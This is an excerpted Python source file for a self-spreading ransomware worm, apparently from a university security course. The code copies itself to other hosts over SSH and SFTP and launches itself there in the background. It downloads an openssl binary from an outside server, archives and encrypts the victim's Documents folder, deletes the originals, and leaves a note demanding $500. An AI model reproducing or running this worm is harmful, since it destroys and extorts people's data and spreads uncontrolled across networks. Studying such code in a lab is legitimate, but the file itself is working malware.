...
Infected_Marker_File = "/home/ubuntu/einfected.txt"

# Randsom Note's content
Ransom_Note = "/home/ubuntu/ransom_note.txt"
...
def markInfected():
	...
	# Create einfected.txt file
	markerFile = open(Infected_Marker_File,"w")

	# Write to file
	markerFile.write("You look very worm :( ")
...
def spreadAndExecute(sshClient):
	...
	sftpClient.put("extorter_worm.py", "/home/ubuntu/extorter_worm.py")

	# Make the worm file exeutable on the remote system
	sshClient.exec_command("chmod a+x /home/ubuntu/extorter_worm.py")
	...
	sshClient.exec_command("nohup python /home/ubuntu/extorter_worm.py 2> error.txt > output.txt &")
...
##################################################################
# Downloads openssl program. Creates a tar archive of the user's
# data and deletes their Documents folder. The data will be copied
# over to the attacker's system. The user will not have access to
# to their data until the random is paid to the attacker.
##################################################################

def extortingUser():

	# Create a global variable for host IP
	global HostIP

	# Download openssl program
	urllib.urlretrieve("http://emerald.ecs.fullerton.edu/openssl", "openssl")

	# Create a tar archive of user's data and name it 192.168.1.x_docs.tgz
	tar = tarfile.open(HostIP + "_docs.tar", "w:gz")
	
	# Add the Documents foler to the tar archive
	tar.add("/home/ubuntu/Documents")

	# Close the tar archive
	tar.close()

	# Remove Documents Folder from the user's system
	shutil.rmtree("/home/ubuntu/Documents/")
		
	# Creates openssl executable
	call(["chmod", "a+x", "./openssl"])
	
	# Create Ransom Note
	ransomFile = open(Ransom_Note,"w")

	# Write to Ransom Note
	ransomFile.write("'Your data has been encrypted! Your local copy of data has been deleted from your system. Pay me $500.00 USD and I will send the key to unlock your data! Mwahaha' ")

	# Close file
	ransomFile.close()
		
	# Encrypts user's documents folder
	call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", HostIP + "_docs.tar", "-out", HostIP + "_docs.tar.enc", "-k", "cs456worm" ])
	
	# Remove the tar file
	os.remove("/home/ubuntu/" + HostIP + "_docs.tar")
...
for host in networkHosts:
	...
	if sshInfo:
		...
		try:
			...
			localpath = "/home/ubuntu/einfected.txt"
